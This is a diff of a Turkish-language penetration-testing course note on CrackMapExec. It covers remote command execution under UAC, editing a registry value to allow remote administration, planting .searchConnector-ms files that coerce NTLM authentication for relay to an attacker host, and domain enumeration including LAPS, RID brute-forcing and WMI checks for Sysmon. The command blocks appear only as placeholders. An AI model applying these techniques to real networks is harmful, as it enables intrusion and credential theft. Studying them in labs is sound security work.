+Ekran görüntüsü seçeneğiyle birleştirilebilecek bir diğer seçenek de RDP bağlantısı sırasındaki ekran çözünürlüğüne karşılık gelen `--res` seçeneğidir. Bu seçenek yararlıdır çünkü aktif bir RDP oturumu bulursak, kullanıcının ekranının boyutuna bağlı olarak tüm içeriği görebiliriz veya göremeyiz. Varsayılan olarak bu seçenek `1024x768` olarak ayarlanmıştır
 
 
-Not: --screentime ve --res isteğe bağlı bayraklardır.
+### Screenshot Alma
+
+{{CODE_BLOCK_147}}
+
+
+Not: `--screentime` ve `--res` isteğe bağlı bayraklardır.
 
 Son olarak, ekran görüntüsünü açmak için MATE'in Eye'ını veya CLI'dan eom'u kullanabiliriz:
 
 
 ### Ekran Görüntüsünü Açmak için MATE'in Gözünü Kullanma
-![Pasted image 20241202232517.png](/img/user/resimler/Pasted%20image%2020241202232517.png)
+
+{{CODE_BLOCK_148}}
+
 ![Pasted image 20241202232523.png](/img/user/resimler/Pasted%20image%2020241202232523.png)
 
-
-Bu bölümde, hedeflerimizi arşivlemeye yardımcı olabilecek LDAP ve RDP kullanarak çeşitli numaralandırma seçeneklerini araştırdık. Bir sonraki bölümde CrackMapExec kullanarak komutların nasıl çalıştırılacağı incelenecektir.
-
+Bu bölümde, hedeflerimize ulaşmamıza yardımcı olabilecek LDAP ve RDP kullanarak çeşitli numaralandırma seçeneklerini inceledik. Aşağıdaki bölüm, CrackMapExec kullanarak komutların nasıl çalıştırılacağını gözden geçirecektir.
 
 
-
+---
 
 ### Command Execution
 
-Remote target üzerinde local administrator olarak bir komut çalıştırmaya çalışmadan önce UAC'nin varlığını kontrol etmeliyiz. UAC etkinleştirildiğinde, ki bu varsayılan durumdur, yalnızca RID 500'e sahip yönetici hesabı (varsayılan yönetici) remote komutları yürütebilir. Durumun böyle olup olmadığını kontrol etmek için iki registry key vardır:
+Remote target üzerinde local administrator olarak bir komut çalıştırmaya çalışmadan önce `UAC`'nin varlığını kontrol etmeliyiz. UAC etkinleştirildiğinde, ki bu varsayılan durumdur, yalnızca `RID 500`'e sahip administrator hesabı (varsayılan administrator) remote komutları yürütebilir. Durumun böyle olup olmadığını kontrol etmek için iki registry key vardır:
 
-![Pasted image 20241203095807.png](/img/user/resimler/Pasted%20image%2020241203095807.png)
+`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy`
+`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`
 
-Varsayılan olarak, LocalAccountTokenFilterPolicy değeri 0 olarak ayarlanmıştır, yani yalnızca built-in administrator hesabı (RID 500) yönetim görevlerini gerçekleştirebilir. Local administrator grubunda olsak bile, yalnızca kullanıcımızın RID'si 500 ise remote komutları çalıştırabiliriz. Değer 1 olarak ayarlanırsa tüm yönetici hesapları yönetim görevlerini yürütebilir.
+Varsayılan olarak, `LocalAccountTokenFilterPolicy` değeri 0 olarak ayarlanmıştır, yani yalnızca built-in administrator hesabı (RID 500) administration görevlerini gerçekleştirebilir. Local administrator grubunda olsak bile, yalnızca kullanıcımızın RID'si `500` ise remote komutları çalıştırabiliriz. Değer 1 olarak ayarlanırsa tüm administrative hesapları yönetim görevlerini yürütebilir.
 
-Yöneticinin yapılandırabileceği bir diğer ayar da local administrator hesabının (RID 500) uzaktan yönetim görevlerini yerine getirmesini engellemektir. Bu, FilterAdministratorToken kayıt defteri değerini 1 olarak ayarlayarak yapılabilir; bu, built-in administrator hesabının (RID 500) remote administrative tasks (uzaktan yönetim görevleri) gerçekleştiremeyeceği anlamına gelir.
+Administrator yapılandırabileceği bir diğer ayar da local administrator hesabının (RID 500) remote yönetim görevlerini yerine getirmesini engellemektir. Bu, `FilterAdministratorToken` registry değerini 1 olarak ayarlayarak yapılabilir; bu, built-in administrator hesabının (RID 500) remote administrative tasks (remote yönetim görevleri) gerçekleştiremeyeceği anlamına gelir.
 
 
+### Administrator Olarak Komut Yürütme
 
-### Command Execution as Administrator
-Komutları çalıştırmak ve administrators grubuna kimlerin üye olduğunu görmek için Administrator hesabını kullanalım. Windows komut satırı komutlarını çalıştırmak için -x seçeneğini ve ardından çalıştırmak istediğimiz komutu kullanmamız gerekir.
+Komutları çalıştırmak ve administrators grubuna kimlerin üye olduğunu görmek için Administrator hesabını kullanalım. Windows komut satırı komutlarını çalıştırmak için `-x` seçeneğini ve ardından çalıştırmak istediğimiz komutu kullanmamız gerekir.
 
 
 ### Bir Komutu Administrator Olarak Çalıştırma
-![Pasted image 20241203100035.png](/img/user/resimler/Pasted%20image%2020241203100035.png)
-![Pasted image 20241203100045.png](/img/user/resimler/Pasted%20image%2020241203100045.png)
+
+{{CODE_BLOCK_149}}
 
 
-### RID 500 Dışı Hesap Olarak Komut Yürütme
-Yukarıdaki komutta, localadmin local user Administrators grubundadır, ancak uzak komutu çalıştıramaz:
+### RID 500 Olmayan Hesap Olarak Komut Yürütme
+
+Yukarıdaki komutta, `localadmin` local user `Administrators` grubundadır, ancak remote komutu çalıştıramaz:
 
 ### Komutu localadmin olarak çalıştırma
-![Pasted image 20241203100238.png](/img/user/resimler/Pasted%20image%2020241203100238.png)
 
-Bu, UAC'nin etkin olduğu anlamına gelir. Eğer durum böyleyse, hesap yönetici olsa bile (Pwn3d!) mesajını almayacağız. Bu ayarı geri almak istiyorsak, LocalAccountTokenFilterPolicy'yi 1 olarak ayarlayabiliriz.
+{{CODE_BLOCK_150}}
+
+Bu, UAC'nin etkin olduğu anlamına gelir. Eğer durum böyleyse, hesap administrator olsa bile (Pwn3d!) mesajını almayacağız. Bu ayarı geri almak istiyorsak, `LocalAccountTokenFilterPolicy`'yi 1 olarak ayarlayabiliriz.
 
 
 ### LocalAccountTokenFilterPolicy'yi Değiştirme
-![Pasted image 20241203100321.png](/img/user/resimler/Pasted%20image%2020241203100321.png)
 
-![Pasted image 20241203100458.png](/img/user/resimler/Pasted%20image%2020241203100458.png)
+{{CODE_BLOCK_151}}
+
+
+{{CODE_BLOCK_152}}
 
 
 ### Domain Hesabı Olarak Komut Yürütme
-LocalAccountTokenFilterPolicy yalnızca local hesaplar için geçerlidir. Bir domain kullanıcımız varsa ve administrators grubunun bir parçasıysa, UAC ayarıyla bile komutu çalıştırabiliriz. Bu senaryoda, INLANEFREIGHT\robert hesabı administrators grubunun bir üyesidir, yani UAC etkin olsa bile komutları yürütebilir.
+
+`LocalAccountTokenFilterPolicy` yalnızca local hesaplar için geçerlidir. Bir domain kullanıcımız varsa ve `administrators` grubunun bir parçasıysa, UAC ayarıyla bile komutu çalıştırabiliriz. Bu senaryoda, `INLANEFREIGHT\robert` hesabı `administrators` `grubunun` bir üyesidir, yani UAC etkin olsa bile komutları yürütebilir.
 
 
 ### Komutu Robert olarak çalıştır
-![Pasted image 20241203100627.png](/img/user/resimler/Pasted%20image%2020241203100627.png)
+
+{{CODE_BLOCK_153}}
 
 
 ### SMB ile Komut Yürütme
-CME'nin dört (4) farklı komut yürütme yöntemi vardır:
-![Pasted image 20241203101103.png](/img/user/resimler/Pasted%20image%2020241203101103.png)
 
-Not: Tüm yöntemler tüm bilgisayarlarda çalışmayabilir.
+CME'nin dört (4) farklı komut yürütme yöntemi vardır:
+
+| Komut   | Açıklama                                                                                                                             |
+| ------- | ------------------------------------------------------------------------------------------------------------------------------------ |
+| wmiexec | WMI (Windows Management Instrumentation) kullanılarak komutlar yürütülür (`diskte dosya oluşturulur`).                               |
+| atexec  | Windows `görev zamanlayıcısı` ile bir görev planlayarak komutlar yürütülür (`fileless`, ancak Windows’un en son sürümünde çalışmaz). |
+| smbexec | Bir servis oluşturup çalıştırarak komutlar yürütülür (`fileless`, ancak Windows’un en son sürümünde çalışmaz).                       |
+| mmcexec | wmiexec yöntemine benzer, ancak komutlar Microsoft Yönetim Konsolu (MMC) aracılığıyla yürütülür.                                     |
+
+Not: Her yöntem her bilgisayarda çalışmayabilir.
 
 Varsayılan olarak, CME biri başarısız olursa farklı bir yürütme yöntemine geçecektir. Komutları aşağıdaki sırayla yürütmeye çalışır:
 
-![Pasted image 20241203101142.png](/img/user/resimler/Pasted%20image%2020241203101142.png)
+* 1. wmiexec 2. atexec 3. smbexec 4. mmcexec
 
-CME'yi yalnızca bir yürütme yöntemi kullanmaya zorlamak istiyorsak, örneğin --exec-method bayrağını kullanarak hangisini kullanacağımızı belirtebiliriz:
+CME'yi yalnızca bir yürütme yöntemi kullanmaya zorlamak istiyorsak, örneğin `--exec-method` bayrağını kullanarak hangisini kullanacağımızı belirtebiliriz:
 
 
 ### SMBExec Yöntemi ile Komut Yürütme
-![Pasted image 20241203101223.png](/img/user/resimler/Pasted%20image%2020241203101223.png)
+
+{{CODE_BLOCK_154}}
 
 Alternatif olarak, -X seçeneğini kullanarak PowerShell ile komutları çalıştırabiliriz:
 
-
 ### wmiexec aracılığıyla PowerShell Komut Yürütme
-![Pasted image 20241203101403.png](/img/user/resimler/Pasted%20image%2020241203101403.png)
-![Pasted image 20241203101435.png](/img/user/resimler/Pasted%20image%2020241203101435.png)
+
+{{CODE_BLOCK_155}}
+
 
 PowerShell seçeneği -X çalıştırıldığında, perde arkasında CrackMapExec aşağıdakileri yapacaktır:
 
@@ -10324,235 +11177,261 @@ Modülü kullandıktan sonra, **LNK dosyasını temizlemek** için **`-o CLEANUP
 {{CODE_BLOCK_121}}
 
 ### drop-sc Modülü ile Hash'lerin Çalınması
-Bu bölümü tamamlamadan önce, **LNK** dışındaki bir dosya formatı kullanarak kimlik doğrulamayı zorlamanın başka bir yöntemine bakalım:[ **.searchConnector-ms**](https://learn.microsoft.com/en-us/windows/win32/search/search-sconn-desc-schema-entry) ve **.library-ms** formatları. Bu dosya formatlarının çoğu Windows sürümünde varsayılan dosya ilişkilendirmeleri bulunur. Windows ile entegre olarak, belirtilen bir WebDAV paylaşımı gibi uzaktaki bir konumu gösterebilecek şekilde, herhangi bir konumdan içerik görüntülemelerini sağlarlar.
 
-Özünde, LNK dosyası ile aynı fonksiyonu yerine getirirler. Bu yöntemin keşfi hakkında daha fazla bilgi edinmek için Windows'ta search connectors ve library dosyalarını keşfetmek başlıklı [blog](https://dtm.uk/exploring-search-connectors-and-library-files-on-windows/) yazısını okuyabilirsiniz.
+Bu bölümü tamamlamadan önce, **LNK** dışında başka bir dosya formatı kullanarak kimlik doğrulamasını zorlamanın başka bir yöntemine bakalım: **[.searchConnector-ms](https://learn.microsoft.com/en-us/windows/win32/search/search-sconn-desc-schema-entry)** ve **`.library-ms`** formatları. Bu dosya formatlarının çoğu Windows sürümünde **varsayılan dosya ilişkilendirmeleri** bulunur. Windows ile entegre çalışarak içeriği rastgele bir konumdan, hatta **`WebDAV` paylaşımıyla belirtilen remote bir konumdan** gösterebilirler.
 
-CrackMapExec, paylaşılan bir klasörde bir searchConnector-ms dosyası oluşturmamızı sağlayan drop-sc adlı bir modüle sahiptir. Bunu kullanmak için, SMB fake sunucumuzu hedeflemek için URL seçeneğini belirtmemiz gerekir. Bu durumda, ntlmrelayx çalıştıran hostumuz. URL'nin çift ters eğik çizgi (\) ile kaçması gerekir, örneğin: URL=\\\\10.10.14.33\\secret .
+Özetle, bu dosyalar **LNK** dosyasıyla aynı işlevi görür. Bu yöntemin keşfi hakkında daha fazla bilgi edinmek için **"[Exploring search connectors and library files in Windows](https://dtm.uk/exploring-search-connectors-and-library-files-on-windows/)"** başlıklı blog yazısını okuyabiliriz.
+
+CrackMapExec, **`drop-sc`** adında bir modüle sahiptir. Bu modül, paylaşılan bir klasörde **`searchConnector-ms`** dosyası oluşturmamıza olanak tanır. Kullanabilmek için **URL** seçeneğini belirterek **SMB fake sunucumuzu** hedef göstermemiz gerekir. Bu durumda, **`ntlmrelayx`** çalıştıran hostumuz olacaktır. **URL** değeri çift ters eğik çizgi (`\`) ile kaçırılmalıdır. Örneğin: **`URL=\\10.10.14.33\secret`**.
 
 İsteğe bağlı olarak aşağıdaki seçenekleri belirleyebiliriz:
 
-* SHARE=name seçeneği ile hedef paylaşımlı klasör . Bu seçeneği belirtmezsek, dosyayı WRITE izinlerine sahip tüm paylaşımlara yazacaktır
+* `SHARE=name` seçeneği ile hedef paylaşımlı klasör . Bu seçeneği belirtmezsek, dosyayı `WRITE` izinlerine sahip tüm paylaşımlara yazacaktır
 
-* FILENAME=name seçeneği ile dosya adı . Bu seçeneği belirtmezsek, “Belgeler” adında bir dosya oluşturacaktır.
+* `FILENAME=name` seçeneği ile dosya adı . Bu seçeneği belirtmezsek, “`Documents`” adında bir dosya oluşturacaktır.
 
-* Oluşturduğumuz dosyaları temizlemek istiyorsak CLEANUP=True seçeneği. Eğer özel bir isim kullanacaksak filename seçeneğini belirtmemiz gerekiyor.
+* Oluşturduğumuz dosyaları temizlemek istiyorsak `CLEANUP=True` seçeneği. Eğer özel bir isim kullanacaksak filename seçeneğini belirtmemiz gerekiyor.
 
 Drop-sc'yi iş başında görelim:
 
-
 ### Dropping a searchConnector-ms File
 
-![Pasted image 20241202202007.png](/img/user/resimler/Pasted%20image%2020241202202007.png)
+{{CODE_BLOCK_122}}
 
-![Pasted image 20241202202025.png](/img/user/resimler/Pasted%20image%2020241202202025.png)
+{{CODE_BLOCK_123}}
 
-Bir kullanıcı paylaşılan klasöre eriştiğinde ve ntlmrelayx dinlerken, hedef makineye de aktarım yapabilmeliyiz.
+Bir kullanıcı **paylaşılan klasöre** eriştiğinde ve **ntlmrelayx** dinleme modunda çalışırken, kimlik bilgilerini **hedef makineye yönlendirebilmemiz** gerekir.
 
+### NTLMRelayx ve drop-sc Kullanarak Yönlendirme
 
-### NTLMRelayx ve drop-sc Kullanarak Aktarma
+{{CODE_BLOCK_124}}
 
-![Pasted image 20241202202103.png](/img/user/resimler/Pasted%20image%2020241202202103.png)
-![Pasted image 20241202202112.png](/img/user/resimler/Pasted%20image%2020241202202112.png)
-
-Son olarak, CLEANUP=True seçeneği ile .searchConnector-ms dosyasını temizleyebiliriz:
+Son olarak, `CLEANUP=True` seçeneği ile `.searchConnector-ms` dosyasını temizleyebiliriz:
 
 
 ### searchConnector-ms Dosyalarını Temizleme
-![Pasted image 20241202202155.png](/img/user/resimler/Pasted%20image%2020241202202155.png)
-![Pasted image 20241202202201.png](/img/user/resimler/Pasted%20image%2020241202202201.png)
 
-LNK dosyaları genellikle bu tür saldırılar için bilinir. .searchConnector-ms gibi başka bir dosya türü kullanmak, fark edilmemenize yardımcı olabilir.
+{{CODE_BLOCK_125}}
 
 
-### SMB ile Eşleme ve Numaralandırma
+LNK dosyaları genellikle bu tür saldırılar için bilinir. `.searchConnector-ms` gibi başka bir dosya türü kullanmak, fark edilmemenize yardımcı olabilir.
+
+Sonraki bölümlerde CrackMapExec'in keşif seçeneklerini inceleyeceğiz.
+
+---
+
+
+### SMB ile Mapping ve Enumeration
 
 CrackMapExec, geçerli bir domain kullanıcı hesabıyla numaralandırma söz konusu olduğunda çok daha fazla seçenekle birlikte gelir. En çok kullanılan seçenekleri ele aldık, ancak daha derine inelim. İşte ayrıcalıklı olmasa bile geçerli bir hesap aldığımızda kullanabileceğimiz tüm seçeneklerin listesi:
 
-![Pasted image 20241202202635.png](/img/user/resimler/Pasted%20image%2020241202202635.png)
-![Pasted image 20241202202649.png](/img/user/resimler/Pasted%20image%2020241202202649.png)
+| Komut                                                                 | Açıklama                                                          |
+| --------------------------------------------------------------------- | ----------------------------------------------------------------- |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --loggedon-users` | Hedefte oturum açmış kullanıcıları listeler.                      |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --sessions`       | Hedefteki aktif oturumları listeler.                              |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --disks`          | Hedefteki diskleri listeler.                                      |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --computers`      | Hedef ağdaki bilgisayarları listeler.                             |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --wmi`            | Belirtilen WMI sorgusunu çalıştırır.                              |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --wmi-namespace`  | WMI Namespace’ini belirtir (varsayılan: `root\cimv2`).            |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --rid-brute`      | Hedef üzerinde RID brute-force yöntemiyle kullanıcıları listeler. |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --local-groups`   | Local grupları listeler; grup belirtilirse üyelerini listeler.    |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --shares`         | Hedefteki tüm paylaşım izinlerini listeler.                       |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --users`          | Hedefteki domain kullanıcılarını listeler.                        |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --groups`         | Hedefteki domain gruplarını listeler.                             |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --pass-pol`       | Domainin password policy'sini gösterir.                           |
 
 Daha önce çalışmamış olanları gözden geçirelim:
 
-### Hedefteki etkin oturumları / oturum açmış kullanıcıları numaralandırma
+### Hedefteki aktif oturumları / oturum açmış kullanıcıları numaralandırma
 
-Birden fazla hedefi tehlikeye attıysak, etkin oturumları kontrol etmeye değer olabilir, belki bir domain yöneticisi vardır ve çabamızı bu belirli hedefe odaklamamız gerekir. Bir bilgisayardaki kullanıcıları tanımlamak için --sessions ve --loggedon-users seçeneklerini kullanabiliriz. Oturumlar, kullanıcı oturum açmamış olsa bile kullanıcı kimlik bilgilerinin hedef makinede kullanıldığı anlamına gelir. Oturum açmış kullanıcılar kendi kendini açıklar; bir kullanıcının hedef makinede oturum açtığı anlamına gelir. Bloodhound, aktif oturumları bulmak için kullanabileceğimiz başka bir araçtır.
+Birden fazla hedefi ele geçirmişsek, aktif oturumları kontrol etmek faydalı olabilir, belki bir domain administrator vardır ve bu belirli hedefe odaklanmamız gerekebilir. Bir bilgisayardaki kullanıcıları tespit etmek için `--sessions` ve `--loggedon-users` seçeneklerini kullanabiliriz. Session'lar, kullanıcının hedef makinede giriş yapmıyor olsa da kullanıcı kimlik bilgileriyle oturum açıldığı anlamına gelir. Giriş yapmış kullanıcılar ise kendiliğinden anlaşılır; bir kullanıcının hedef makineye giriş yapmış olduğunu ifade eder. `BloodHound`, aktif oturumları bulmak için kullanabileceğimiz bir diğer araçtır.
 
 
 ### Sessions ve loggendon-users seçeneklerini kullanma
-![Pasted image 20241202203026.png](/img/user/resimler/Pasted%20image%2020241202203026.png)
 
-Belirli bir kullanıcıyı arıyorsak, --loggedon-users-filter seçeneğini ve ardından aradığımız kullanıcının adını kullanabiliriz. Birden fazla kullanıcı arıyorsak, regex'i de destekler.
+{{CODE_BLOCK_126}}
+
+Belirli bir kullanıcıyı arıyorsak, -`-loggedon-users-filter` seçeneğini ve ardından aradığımız kullanıcının adını kullanabiliriz. Birden fazla kullanıcı arıyorsak, `regex`'i de destekler.
 
 
 ### Oturum açmış kullanıcılarla filtre seçeneğini kullanma
-![Pasted image 20241202203114.png](/img/user/resimler/Pasted%20image%2020241202203114.png)
-![Pasted image 20241202203120.png](/img/user/resimler/Pasted%20image%2020241202203120.png)
+
+{{CODE_BLOCK_127}}
+
+Not: Genellikle, `--loggedon-users` veya `--sessions` parametrelerinin başarılı bir şekilde çalıştırılabilmesi için administrator izinleri gereklidir.
+
 
 
 ### Enumerate Computers
 
 CME ayrıca domain bilgisayarlarını da listeleyebilir ve bunu bir LDAP isteği gerçekleştirerek yapar
 
-
 ### Domain'deki Bilgisayarları Numaralandırma
-![Pasted image 20241202203511.png](/img/user/resimler/Pasted%20image%2020241202203511.png)
+
+{{CODE_BLOCK_128}}
+
 
 Not: Bu seçenek yalnızca SMB protokolünde mevcut olsa da, CME bir LDAP sorgusu yapmaktadır.
 
 
 ### Enumerate LAPS
 
-Local Administrator Password Solution (LAPS), domain'e bağlı bilgisayarların local hesap parolalarının yönetimini sağlar. Parolalar Active Directory'de (AD) saklanır ve ACL tarafından korunur, böylece yalnızca uygun kullanıcılar bunları okuyabilir veya sıfırlama talebinde bulunabilir. LAPS domain içinde kullanılıyorsa ve LAPS şifrelerini okuyabilen bir hesabı tehlikeye atarsak, --laps seçeneğini bir hedef listesi ile kullanabilir ve komutları çalıştırabilir veya --sam gibi diğer seçenekleri kullanabiliriz.
+Local Administrator Password Solution (LAPS), domain'e bağlı bilgisayarların local hesap parolalarının yönetimini sağlar. Parolalar Active Directory'de (AD) saklanır ve ACL tarafından korunur, böylece yalnızca uygun kullanıcılar bunları okuyabilir veya sıfırlama talebinde bulunabilir. LAPS domain içinde kullanılıyorsa ve LAPS şifrelerini okuyabilen bir hesabı tehlikeye atarsak, `--laps` seçeneğini bir hedef listesi ile kullanabilir ve komutları çalıştırabilir veya `--sam` gibi diğer seçenekleri kullanabiliriz.
 
-![Pasted image 20241202203817.png](/img/user/resimler/Pasted%20image%2020241202203817.png)
 
-![Pasted image 20241202203835.png](/img/user/resimler/Pasted%20image%2020241202203835.png)
+{{CODE_BLOCK_129}}
 
-![Pasted image 20241202203857.png](/img/user/resimler/Pasted%20image%2020241202203857.png)
-
-Not: Varsayılan yönetici hesabı adı “administrator” değilse, kullanıcı adını --laps kullanıcı adı seçeneğinden sonra ekleyin.
-
+Not: Eğer varsayılan administrator hesap adı "`administrator`" değilse, -`-laps username` seçeneğinden sonra kullanıcı adını ekleyin.
 
 ### Hedefteki RID'yi Brute-forcing yaparak Kullanıcıları Numaralandır --rid-brute
 
-Nadiren kullanılan bir özellik, kullanıcı listeleri oluşturmak için RID Bruteforce'dur. BloodHound veya PowerView ile bir kullanıcı listesi oluşturabiliriz. Ancak, bu teknikler muhtemelen yakalanacak ve kurulumu biraz zaman alacaktır. CrackMapExec'in --rid-brute seçeneğini kullanarak, UserID'sini brute forcing yaparak bir kullanıcı listesi toplamak mümkündür.
+Nadiren kullanılan bir özellik, kullanıcı listeleri oluşturmak için `RID Bruteforce`'dur. `BloodHound` veya `PowerView` ile bir kullanıcı listesi oluşturabiliriz. Ancak, bu teknikler muhtemelen yakalanacak ve kurulumu biraz zaman alacaktır. CrackMapExec'in `--rid-brute` seçeneğini kullanarak, UserID'sini brute forcing yaparak bir kullanıcı listesi toplamak mümkündür.
 
 
 ### List Local Users
 
-![Pasted image 20241202204115.png](/img/user/resimler/Pasted%20image%2020241202204115.png)
-![Pasted image 20241202204130.png](/img/user/resimler/Pasted%20image%2020241202204130.png)
-![Pasted image 20241202204141.png](/img/user/resimler/Pasted%20image%2020241202204141.png)
-![Pasted image 20241202204153.png](/img/user/resimler/Pasted%20image%2020241202204153.png)
-![Pasted image 20241202204200.png](/img/user/resimler/Pasted%20image%2020241202204200.png)
+{{CODE_BLOCK_130}}
 
-Varsayılan olarak, --rid-brute 4000'e kadar RID'leri zorlayarak nesneleri numaralandırır. Davranışını --rid-brute [MAX_RID] kullanarak değiştirebiliriz.
+Varsayılan olarak, `--rid-brute 4000`'e kadar RID'leri zorlayarak objeleri numaralandırır. Davranışını `--rid-brute [MAX_RID]` kullanarak değiştirebiliriz.
 
-rid-brute seçeneği, brute ile zorlanan kimliklerle eşleşen kullanıcı adlarını ve diğer Active Directory nesnelerini almak için kullanılabilir. NULL Authentication etkinleştirilmişse domain hesaplarını numaralandırmak için de kullanılabilir. Bu seçeneğin bu şekillerde kullanılabileceğini unutmamak önemlidir.
-
+`--rid-brute` seçeneği, brute ile zorlanan kimliklerle eşleşen kullanıcı adlarını ve diğer Active Directory objeleri almak için kullanılabilir. `NULL Authentication` etkinleştirilmişse domain hesaplarını numaralandırmak için de kullanılabilir. Bu seçeneğin bu şekillerde kullanılabileceğini unutmamak önemlidir.
 
 ### Enumerate Disks
 
-Bazen kontrol etmeyi hatırlamamız gereken önemli bir parça, bir sunucuda bulunabilecek ek disklerdir. CrackMapExec, sunucuda var olan diskleri kontrol etmemizi sağlayan bir --disks seçeneğine sahiptir.
+Bazen kontrol etmeyi hatırlamamız gereken önemli bir parça, bir sunucuda bulunabilecek ek disklerdir. CrackMapExec, sunucuda var olan diskleri kontrol etmemizi sağlayan bir `--disks` seçeneğine sahiptir.
 
 ### Enumerating Disks
-![Pasted image 20241202204448.png](/img/user/resimler/Pasted%20image%2020241202204448.png)
+
+{{CODE_BLOCK_131}}
 
 
 ### Local ve Domain Gruplarını Numaralandırma
-Local-groups ile local grupları veya --groups ile domain gruplarını listeleyebiliriz.
+
+Local-groups ile local grupları veya `--groups` ile domain gruplarını listeleyebiliriz.
 
 ### Enumerating Local Groups
-![Pasted image 20241202204607.png](/img/user/resimler/Pasted%20image%2020241202204607.png)
-![Pasted image 20241202204629.png](/img/user/resimler/Pasted%20image%2020241202204629.png)
 
+{{CODE_BLOCK_132}}
 
 ### Enumerating Domain Groups
-![Pasted image 20241202204749.png](/img/user/resimler/Pasted%20image%2020241202204749.png)
-![Pasted image 20241202204830.png](/img/user/resimler/Pasted%20image%2020241202204830.png)
 
-Eğer grup üyelerini almak istiyorsak, --groups [GRUP ADI] kullanabiliriz.
+{{CODE_BLOCK_133}}
+
+
+Eğer grup üyelerini almak istiyorsak, `--groups [GRUP ADI]` kullanabiliriz.
 
 
 ### Group **Members**
-![Pasted image 20241202204931.png](/img/user/resimler/Pasted%20image%2020241202204931.png)
 
-Not: Yazım sırasında --local-group yalnızca bir Domain Controller'a karşı çalışır ve grup adını kullanarak bir grubu sorgulamak işe yaramaz.
+{{CODE_BLOCK_134}}
+
+Not: Yazım sırasında `--local-group` yalnızca bir Domain Controller'a karşı çalışır ve grup adını kullanarak bir grubu sorgulamak işe yaramaz.
 
 
-### Querying WMI
-[Windows Management Instrumentation](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) (WMI), Windows işletim sistemlerinde yönetimsel işlemler için kullanılır. Remote bilgisayarlardaki yönetim görevlerini otomatikleştirmek için WMI komut dosyaları veya uygulamaları yazabiliriz. WMI, işletim sisteminin diğer bölümlerine ve System Center Operations Manager (eski adıyla Microsoft Operations Manager (MOM)) veya Windows Remote Management (WinRM) gibi ürünlere yönetim verileri sağlar.
+### WMI Sorgulama
 
-Windows Yönetim Araçları'nın (WMI) birincil kullanım alanlarından biri, sınıf ve örnek bilgileri için WMI havuzunu sorgulama yeteneğidir. Örneğin, WMI'dan remote veya local bir sistemden shut-down olaylarını temsil eden tüm nesneleri döndürmesini isteyebiliriz.
+[Windows Management Instrumentation](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) (WMI), Windows işletim sistemlerinde administrative işlemler için kullanılır. Remote bilgisayarlardaki administrative görevlerini otomatikleştirmek için WMI script dosyaları veya uygulamaları yazabiliriz. WMI, işletim sisteminin diğer bölümlerine ve System Center Operations Manager (eski adıyla Microsoft Operations Manager (MOM)) veya Windows Remote Management (WinRM) gibi ürünlere yönetim verileri sağlar.
 
-WMI, TCP port 135 ve bir dizi dinamik port kullanır: 49152-65535 (RPC dinamik portları - Windows Vista, 2008 ve üzeri), TCP 1024-65535 (RPC dinamik portları - Windows NT4, Windows 2000, Windows 2003) veya WMI'yı özel bir port aralığı kullanacak şekilde ayarlayabiliriz
+Windows Management Instrumentation'nın (WMI) birincil kullanım alanlarından biri, sınıf (class) ve örnek (instance) bilgileri için WMI havuzunu sorgulama yeteneğidir. Örneğin, WMI'dan remote veya local bir sistemden shut-down olaylarını temsil eden tüm objeleri döndürmesini isteyebiliriz.
 
-Örneğin, remote bir bilgisayarda Sysmon uygulamasının çalışıp çalışmadığını sorgulamak ve Caption ve ProcessId'yi görüntülemek için WMI kullanalım, kullanacağımız WMI sorgusu SELECT Caption,ProcessId FROM Win32_Process WHERE Caption LIKE '%sysmon%' şeklindedir:
+WMI, TCP port `135` ve bir dizi dinamik port kullanır: `49152-65535 (RPC dinamik portları - Windows Vista, 2008 ve üzeri)`, TCP 1024-65535 (RPC dinamik portları - Windows NT4, Windows 2000, Windows 2003) veya WMI'yı özel bir port aralığı kullanacak şekilde ayarlayabiliriz
+
+Örneğin, remote bir bilgisayarda `Sysmon` uygulamasının çalışıp çalışmadığını sorgulamak ve `Caption` ve `ProcessId`'yi görüntülemek için WMI kullanalım, kullanacağımız WMI sorgusu S`ELECT Caption,ProcessId FROM Win32_Process WHERE Caption LIKE '%sysmon%'` şeklindedir:
 
 
 ### Sysmon'un Çalışıp Çalışmadığını Sorgulamak için WMI Kullanma
-![Pasted image 20241202210123.png](/img/user/resimler/Pasted%20image%2020241202210123.png)
 
-WMI, sınıflarını hiyerarşik bir ad alanında düzenler. Bir sorgu gerçekleştirmek için, Class Name (Sınıf Adı) ve içinde bulunduğu Namespace'i (Ad Alanı) bilmemiz gerekir. Yukarıdaki örnekte, root\cimv2 namespace'indeki Win32_Process sınıfını sorgulayın. Namespace belirtmedik çünkü varsayılan olarak CME root\cimv2 kullanır (bu bilgiyi --help menüsünde görebiliriz)
+{{CODE_BLOCK_135}}
 
-Başka bir namespace'i sorgulamak için onu belirtmemiz gerekir. Örneğin, root\WMI namespace'inde bulunan MSPower_DeviceEnable sınıfını sorgulayalım. Bu sınıf, sistem çalışırken dinamik olarak açılıp kapanması gereken cihazlar hakkında bilgi tutar. Belirli bir konuyla ilgili WMI sınıflarının nasıl bulunacağı hakkında daha fazla bilgi edinmek için [Microsoft](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_wmi?view=powershell-5.1#finding-wmi-classes) ve [wutils.com'](https://wutils.com/wmi/)daki 3. taraf belgelerini kullanabiliriz.
